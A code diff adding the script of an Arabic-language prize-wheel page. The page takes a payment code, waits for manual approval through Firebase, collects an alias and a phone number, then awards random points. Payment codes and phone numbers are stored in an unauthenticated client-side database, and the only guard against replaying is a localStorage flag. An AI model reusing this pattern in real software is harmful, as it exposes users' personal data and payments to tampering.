@@ -53,4 +53,88 @@
                 <span id="res-val">ELITE</span>
             </div>
         </div>
-        <button onclick="spinNow()" id="spin-btn">إ
+        <button onclick="spinNow()" id="spin-btn">إطلاق العجلة</button>
+        <p id="win-msg" style="margin-top:10px; font-weight:bold;"></p>
+    </div>
+</div>
+
+<script>
+    // نظام الحماية من إعادة التحميل
+    window.onload = function() {
+        if (localStorage.getItem('hasPlayedToday') === 'true') {
+            document.getElementById('main-box').innerHTML = '<h2 style="color:#ff3e3e;">عذراً!</h2><p>لقد استنفدت محاولتك اليومية. النظام يغلق تلقائياً لمدة 24 ساعة.</p>';
+        }
+    };
+
+    const firebaseConfig = {
+        databaseURL: "https://m-token-5ce65-default-rtdb.europe-west1.firebasedatabase.app/"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    let uId = "USER_" + Math.floor(Math.random() * 9000);
+    let timerInt;
+
+    function requestAccess() {
+        const code = document.getElementById('pay-code').value;
+        if(code.length < 5) return alert("كود خاطئ");
+        db.ref('active_requests/' + uId).set({ code: code, approved: false });
+        document.getElementById('step-pay').classList.add('hidden');
+        document.getElementById('step-wait').classList.remove('hidden');
+
+        db.ref('active_requests/' + uId + '/approved').on('value', (snap) => {
+            if(snap.val() === true) {
+                document.getElementById('step-wait').classList.add('hidden');
+                document.getElementById('step-profile').classList.remove('hidden');
+                startTimer();
+            }
+        });
+    }
+
+    function startTimer() {
+        let sec = 15 * 60;
+        timerInt = setInterval(() => {
+            let m = Math.floor(sec/60); let s = sec%60;
+            document.getElementById('timer').innerText = `${m}:${s < 10 ? '0'+s : s}`;
+            if(sec <= 0) location.reload();
+            sec--;
+        }, 1000);
+    }
+
+    function saveUser() {
+        const a = document.getElementById('alias').value;
+        const p = document.getElementById('phone').value;
+        if(!a || !p) return alert("أكمل البيانات");
+        db.ref('members/' + uId).set({ alias: a, phone: p, win: 0 });
+        clearInterval(timerInt);
+        document.getElementById('step-profile').classList.add('hidden');
+        document.getElementById('step-wheel').classList.remove('hidden');
+    }
+
+    function spinNow() {
+        const btn = document.getElementById('spin-btn');
+        const wheel = document.getElementById('wheel');
+        btn.disabled = true;
+
+        let randDeg = Math.floor(Math.random() * 3600) + 720; 
+        wheel.style.transform = `rotate(${randDeg}deg)`;
+
+        setTimeout(() => {
+            let points = [10, 50, 100, 200, 500, 0][Math.floor(Math.random() * 6)];
+            document.getElementById('res-val').innerText = points + " PTS";
+            document.getElementById('win-msg').innerText = "مبروك! ربحت " + points + " نقطة";
+            
+            // حفظ النتيجة وتفعيل الحماية
+            db.ref('members/' + uId + '/win').set(points);
+            localStorage.setItem('hasPlayedToday', 'true'); // تفعيل منع إعادة المحاولة
+            
+            alert("تم تسجيل نقاطك بنجاح. عد غداً لمحاولة جديدة!");
+        }, 4100);
+    }
+</script>
+
+<style>
+    @keyframes rotate { from {transform: rotate(0deg);} to {transform: rotate(360deg);} }
+</style>
+</body>
+</html>
